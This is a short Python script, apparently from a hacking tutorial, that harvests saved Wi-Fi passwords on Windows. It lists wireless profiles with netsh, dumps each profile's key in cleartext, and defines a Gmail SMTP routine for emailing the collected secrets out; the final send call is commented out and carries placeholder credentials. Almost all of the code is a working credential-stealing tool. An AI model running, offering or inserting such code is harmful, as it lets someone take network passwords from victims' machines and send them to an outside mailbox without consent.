#!/usr/bin/env python

import subprocess, smtplib, re


def send_email(email, password, message):
    # google allow others to user there smtp server
    # send email
    # address for google's server and port
    server = smtplib.SMTP("smtp.gmail.com", 587)       
    # initiate tls connection
    server.starttls()
    # login to email
    server.login(email, password)
    # from to content
    server.sendmail(email, email, message)     
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
#non-capturing group
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)		
# print(network_names_list)


result = ""
for network_name in network_names_list:
	print(network_name)
	command = "netsh wlan show profile " + network_name + " key=clear"
	try:
		current_result = subprocess.check_output(command, shell=True)
		result = result + current_result
	except subprocess.CalledProcessError:
		print("error")

	print(current_result)
	# result = result + current_result

# print(result)
# send_email("test@gmail.com", "testettetetet", result)

